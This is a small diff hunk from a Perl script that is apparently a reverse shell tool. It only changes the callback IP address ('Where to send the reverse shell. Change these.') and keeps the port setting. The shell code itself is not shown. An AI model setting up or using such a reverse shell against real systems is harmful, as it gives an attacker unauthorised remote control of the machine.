@@ -7,7 +7,7 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = '192.168.70.129';
+my $ip = '192.168.121.150';
 my $port = 53921;
 
 # Options
